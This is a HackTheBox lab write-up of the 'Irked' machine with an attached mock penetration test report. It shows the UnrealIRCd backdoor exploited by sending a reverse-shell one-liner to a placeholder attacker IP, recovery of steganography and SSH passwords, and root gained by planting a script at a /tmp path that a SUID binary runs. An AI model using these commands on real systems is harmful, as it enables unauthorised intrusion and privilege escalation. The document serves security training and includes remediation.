@@ -1,0 +1,370 @@
+# Irked
+
+**Platform:** HackTheBox
+**OS:** Linux
+**Tags:** UnrealIRCd, CVE-2010-2075, IRC Backdoor, Supply Chain, Steghide, Steganography, SUID
+**Date:** 2026-10-06
+
+Three ports running the same IRC daemon is the first hint something is off. UnrealIRCd 3.2.8.1 was a supply-chain compromise -- the official tarball was quietly replaced with a backdoored build that executes anything prefixed with `AB;` via system(). That gets a shell as ircd. A hidden backup file in djmardov's home directory contains a steganography password, which extracts djmardov's SSH password from an image on the web server. From there a custom SUID binary calls system() on a path in world-writable /tmp, which doesn't exist -- so we write it ourselves and root runs it.
+
+## 1. Enumeration
+
+```bash
+nmap -sC -sV -p- 10.129.79.131
+```
+
+```
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
+80/tcp    open  http    Apache httpd 2.4.10 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+50714/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux
+```
+
+Added `irked.htb` to `/etc/hosts`. The same IRC daemon on three ports with the default port 6667 closed is unusual. That detail matters later with the Metasploit module.
+
+### Web (port 80)
+
+```bash
+curl -si http://10.129.79.131/
+```
+
+```html
+<img src=irked.jpg>
+<b><center>IRC is almost working!</b></center>
+```
+
+Just a page pointing at IRC. Grabbed the image and checked it for hidden data -- nothing surfaced at this point. The steg password came up later and made sense of it then.
+
+```bash
+wget http://10.129.79.131/irked.jpg
+strings irked.jpg
+exiftool irked.jpg
+```
+
+Content discovery found only `manual/` and `server-status`, both uninteresting. IRC is the way in.
+
+## 2. Foothold: UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
+
+### Identify the vulnerability
+
+```bash
+ls /usr/share/nmap/scripts/ | grep -i irc
+nmap -p 6697 --script irc-unrealircd-backdoor irked.htb
+```
+
+```
+6697/tcp open  ircs-u
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd.
+   See http://seclists.org/fulldisclosure/2010/Jun/277
+```
+
+This version of UnrealIRCd was a supply-chain compromise, the official download tarball was quietly replaced with a backdoored build. Any line starting with `AB;` gets the remainder passed directly to `system()` on the host. Execution is blind, no output comes back.
+
+### Exploitation
+
+```bash
+penelope -p 5555
+```
+
+```bash
+echo 'AB; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"' | nc irked.htb 6697
+```
+
+```
+[+] [New Reverse Shell] => irked 10.129.79.131 Linux-i686 ircd(1001)
+ircd@irked:~/Unreal3.2$ id
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+```
+
+**Dead end - Metasploit:** `exploit/unix/irc/unreal_ircd_3281_backdoor` connects fine but its default port is 6667, which is closed here. After setting `RPORT 6697` it confirmed vulnerable but the session never materialised: "Exploit completed, but no session was created." The backdoor is blind so there is no indication why the payload failed. The manual method gives full control over the payload and worked first try, so Metasploit is not worth the OSCP allowance on this one.
+
+## 3. Lateral movement: ircd to djmardov
+
+`user.txt` is in djmardov's home and `ircd` cannot read it. Poking around turns up a hidden backup file in djmardov's Documents:
+
+```bash
+ls -la /home/djmardov/Documents
+cat /home/djmardov/Documents/.backup
+```
+
+```
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+
+"Steg backup pw" is the password for the image on the web server from earlier. Extract it on Kali:
+
+```bash
+steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+cat pass.txt
+```
+
+```
+Kab6h+m+bbp2J:HG
+```
+
+SSH in with that:
+
+```bash
+ssh djmardov@10.129.79.131
+```
+
+```
+djmardov@irked:~$ cat Documents/user.txt
+redacted
+```
+
+## 4. Privilege escalation: SUID `/usr/bin/viewuser`
+
+SUID enumeration, everything standard except one binary:
+
+```bash
+find / -user root -perm /4000 2>/dev/null
+```
+
+```
+...
+/usr/bin/viewuser
+...
+```
+
+`sudo` is not installed, so that path is out. Strings on the custom binary:
+
+```bash
+strings /usr/bin/viewuser
+```
+
+```
+setuid
+system
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+/tmp/listusers
+```
+
+It calls `setuid()` then runs `system("/tmp/listusers")`. The file doesn't exist and `/tmp` is world-writable, so we just create it:
+
+```bash
+echo '#!/bin/bash' > /tmp/listusers
+echo '/bin/bash -p' >> /tmp/listusers
+chmod +x /tmp/listusers
+/usr/bin/viewuser
+```
+
+```
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+...
+root@irked:~# id
+uid=0(root)
+root@irked:/root# cat root.txt
+redacted
+```
+
+## 5. Flags
+
+- User: `redacted`
+- Root: `redacted`
+
+---
+
+## Penetration Test Report
+
+**Target:** irked.htb
+**Address:** 10.129.79.131
+**Assessment type:** External network & web application assessment
+**Assessment date:** 06 October 2026
+**Environment:** HackTheBox laboratory assessment  |  Linux
+**Prepared by:** Ledion Mujaj
+**Reference:** HTB-IRK-01
+
+---
+
+## 1. Executive Summary
+
+Testing of **irked.htb** identified three findings that together produced full root compromise. The host ran UnrealIRCd 3.2.8.1, a version known to have been distributed as a trojaned tarball in a supply-chain attack. The backdoor allows any remote party to execute arbitrary commands on the host via a crafted IRC message, producing a shell as the `ircd` service account. A hidden file in a local user's home directory contained a steganography password; applying it to an image served on the web server extracted that user's plaintext SSH password, enabling lateral movement to `djmardov`. A custom SUID binary owned by root was found to call `system()` on a hardcoded path inside the world-writable `/tmp` directory. The referenced file did not exist; placing a malicious script at that path caused it to execute as root when the binary was run.
+
+**Priority recommendations:**
+
+1. Replace the UnrealIRCd installation immediately with a clean, verified build from a trusted source. Verify checksums before deploying any service binary.
+2. Remove the `.backup` file from djmardov's home directory and rotate the SSH password. Do not embed credentials in files accessible to other accounts on the host.
+3. Remove the `viewuser` SUID binary or rewrite it to use an absolute, root-owned executable path rather than a world-writable directory.
+
+---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| irked.htb | 10.129.79.131 | Debian 8 Linux; IRC on multiple ports, SSH on 22, HTTP on 80. |
+
+| Port | Service | Observed detail |
+|------|---------|----------------|
+| 22/tcp | SSH | OpenSSH 6.7p1 Debian 5+deb8u4 |
+| 80/tcp | HTTP | Apache httpd 2.4.10; single page with image, references IRC |
+| 6697/tcp | IRC | UnrealIRCd 3.2.8.1 (trojaned build) |
+| 8067/tcp | IRC | UnrealIRCd 3.2.8.1 (trojaned build) |
+| 65534/tcp | IRC | UnrealIRCd 3.2.8.1 (trojaned build) |
+
+Testing began with a full port scan. The UnrealIRCd version was identified and confirmed vulnerable to CVE-2010-2075 using the Nmap irc-unrealircd-backdoor script. A manual exploit was crafted to send the `AB;` prefix and deliver a reverse shell. Post-foothold enumeration of readable files on the host revealed a hidden backup file containing a steganography password. The web server image was retrieved and the password used with `steghide` to extract embedded credentials. SSH was used to authenticate as `djmardov`. SUID binary enumeration identified a non-standard binary calling `system()` on a path in `/tmp`. A malicious script was placed at that path and the binary executed to obtain a root shell.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | UnrealIRCd 3.2.8.1 supply-chain backdoor (CVE-2010-2075) | **Critical** |
+| F-02 | Plaintext credential stored in steganographic web image | **High** |
+| F-03 | SUID binary executes world-writable path as root | **Critical** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | Identified UnrealIRCd 3.2.8.1 on port 6697. Confirmed trojaned build via Nmap script. Sent `AB;` prefixed reverse shell payload via netcat. | Remote shell as `ircd` |
+| 02 | Found `.backup` file in djmardov's Documents containing a steganography password. Applied it to `irked.jpg` from the web server using `steghide` to extract djmardov's SSH password. | SSH shell as `djmardov` |
+| 03 | SUID enumeration identified `/usr/bin/viewuser`. Strings showed it calls `system("/tmp/listusers")`. Placed a malicious script at that path and executed the binary. | Root shell |
+
+---
+
+## 4.1 UnrealIRCd 3.2.8.1 Supply-Chain Backdoor
+
+### F-01   CVE-2010-2075 -- IRC daemon trojaned build - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The host ran UnrealIRCd 3.2.8.1, a version distributed via the official project website as a trojaned tarball between November 2009 and June 2010. The backdoor processes any IRC message prefixed with `AB;` and executes the remainder via `system()` on the host. No authentication is required. Three ports (6697, 8067, 65534) exposed the affected daemon. |
+| Prerequisites | Network access to any of the exposed IRC ports. No prior credentials required. |
+| Impact | Unauthenticated remote code execution as the `ircd` service account. Full filesystem access for that account and a foothold to enumerate the host for further escalation. |
+| Affected system | irked.htb ports 6697, 8067, 65534 -- UnrealIRCd 3.2.8.1 |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-506: Embedded Malicious Code |
+
+**Steps to reproduce:**
+
+1. Start a listener: `nc -lvnp 5555`
+2. Send the trigger: `echo 'AB; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"' | nc irked.htb 6697`
+3. Receive shell as `ircd`.
+
+**Evidence:**
+
+```
+$ nmap -p 6697 --script irc-unrealircd-backdoor irked.htb
+6697/tcp open  ircs-u
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd.
+
+$ echo 'AB; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"' | nc irked.htb 6697
+
+ircd@irked:~/Unreal3.2$ id
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+```
+
+Attacker IP redacted.
+
+**Remediation:** Replace UnrealIRCd 3.2.8.1 with a clean, verified build. Verify SHA256 checksum against the official project listing before deployment. If IRC is not required, remove the service and block the ports at the firewall.
+
+**Verification:** Confirm the running version is not 3.2.8.1. Verify the binary checksum. Confirm the `AB;` trigger no longer produces code execution.
+
+---
+
+## 4.2 Plaintext Credential Stored in Steganographic Web Image
+
+### F-02   irked.jpg -- embedded SSH password - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | A file at `/home/djmardov/Documents/.backup`, readable by the `ircd` account, contained the plaintext steganography password `UPupDOWNdownLRlrBAbaSSss`. Applying this to `irked.jpg`, publicly accessible on the web server, with `steghide` extracted a file containing djmardov's SSH password in plaintext. |
+| Prerequisites | Read access to `/home/djmardov/Documents/.backup` (accessible via the `ircd` foothold from F-01) and the ability to retrieve `irked.jpg` from the web server. |
+| Impact | Plaintext SSH password for `djmardov` obtained. Direct SSH authentication as that user. |
+| Affected system | irked.htb -- `/home/djmardov/Documents/.backup` and `http://irked.htb/irked.jpg` |
+| CVSS 3.1 | 7.5 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-312: Cleartext Storage of Sensitive Information |
+
+**Steps to reproduce:**
+
+1. Read the backup file: `cat /home/djmardov/Documents/.backup`
+2. Retrieve the image: `wget http://irked.htb/irked.jpg`
+3. Extract: `steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss`
+4. Read `pass.txt` for the SSH password.
+5. Authenticate: `ssh djmardov@irked.htb`
+
+**Evidence:**
+
+```
+ircd@irked:/home/djmardov/Documents$ cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+
+$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+
+$ cat pass.txt
+Kab6h+m+bbp2J:HG
+
+djmardov@irked:~$ id
+uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov)
+```
+
+**Remediation:** Delete `/home/djmardov/Documents/.backup` and rotate the SSH password immediately. Do not store passwords in files accessible to other accounts. If steganography is used legitimately, the container and its key must never be co-located or derivable from publicly accessible resources.
+
+**Verification:** Confirm the `.backup` file has been removed. Verify the djmardov SSH password has been rotated. Confirm `irked.jpg` no longer contains extractable data.
+
+---
+
+## 4.3 SUID Binary Executes World-Writable Path as Root
+
+### F-03   /usr/bin/viewuser -- SUID arbitrary execution - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The custom SUID binary `/usr/bin/viewuser`, owned by root, calls `setuid(0)` and then `system("/tmp/listusers")`. The file `/tmp/listusers` does not exist and `/tmp` is world-writable. Any local user can place a script at that path, execute `viewuser`, and have their script run as root. |
+| Prerequisites | Local authenticated access as any user. No special privileges required. |
+| Impact | Arbitrary command execution as root. Full compromise of the host. |
+| Affected system | irked.htb -- `/usr/bin/viewuser` (SUID root) |
+| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-732: Incorrect Permission Assignment for Critical Resource |
+
+**Steps to reproduce:**
+
+1. `echo '#!/bin/bash' > /tmp/listusers && echo '/bin/bash -p' >> /tmp/listusers`
+2. `chmod +x /tmp/listusers`
+3. `/usr/bin/viewuser`
+
+**Evidence:**
+
+```
+$ strings /usr/bin/viewuser
+...
+system
+/tmp/listusers
+
+$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+
+root@irked:/root# id
+uid=0(root) gid=0(root) groups=0(root)
+root@irked:/root# cat root.txt
+[redacted]
+```
+
+**Remediation:** Remove the SUID bit from `viewuser` or delete the binary if not required. If retained, rewrite it to execute a fixed absolute path in a root-owned, non-writable directory. Audit all SUID and SGID binaries on the host for similar patterns.
+
+**Verification:** Confirm `/usr/bin/viewuser` no longer has the SUID bit set or has been removed. Verify a local user cannot obtain a root shell by placing a file in `/tmp` and executing the binary.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Immediate | Replace UnrealIRCd 3.2.8.1 with a clean, verified build. Verify binary checksum before deployment. | F-01 |
+| Immediate | Remove SUID bit from `/usr/bin/viewuser` or delete the binary. Audit all SUID binaries. | F-03 |
+| High | Delete `/home/djmardov/Documents/.backup` and rotate the SSH password. Remove embedded data from `irked.jpg`. | F-02 |
+
+**Test artefacts:** `/tmp/listusers` was created on the target to exploit the viewuser binary. It should be confirmed removed.
